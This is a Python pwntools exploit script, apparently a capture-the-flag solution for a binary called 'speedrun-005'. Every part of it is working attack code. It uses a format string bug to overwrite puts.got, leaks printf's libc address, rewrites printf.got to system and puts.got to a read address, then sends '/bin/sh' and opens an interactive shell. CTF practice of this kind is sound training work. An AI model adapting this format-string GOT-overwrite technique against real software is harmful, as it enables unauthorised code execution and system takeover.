#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

vuln_addr = 0x40069d
read_addr = 0x4006c8

elf = ELF('speedrun-005')
p = process(elf.path)
libc = elf.libc

if args.GDB:
    gdb.attach(p, '''
        break * 0x40068a
        break * 0x4006c8
        continue
        ''')

# 1. Overwrites puts.got with vuln function address

ret_to_vuln = {
        elf.got.puts: vuln_addr
        }

p_ret_to_vuln = fmtstr_payload(6, ret_to_vuln, 0)
p.sendlineafter(b'time? ', p_ret_to_vuln)

# 2. Leak libc base address

p_leak_libc = b'%7$s....' + p64(elf.got.printf)
p.sendlineafter(b'time? ', p_leak_libc)

p.recvuntil(b'Interesting ')
printf_addr = u64(p.recvuntil(b'....')[:-4].ljust(8, b'\x00'))
libc.address = printf_addr - libc.sym.printf

log.success(f'printf @ {hex(printf_addr)}')
log.info(f'libc @ {hex(libc.address)}')

# 3. Overwrite printf.got with system address and puts.got with read address

write_system = {
        elf.got.printf: libc.sym.system,
        elf.got.puts: read_addr
        }

p_write_system = fmtstr_payload(6, write_system, 0)
p.sendlineafter(b'time? ', p_write_system)

# 4. Send b'/bin/sh\x00'

p.sendline(b'/bin/sh\x00')

p.interactive()
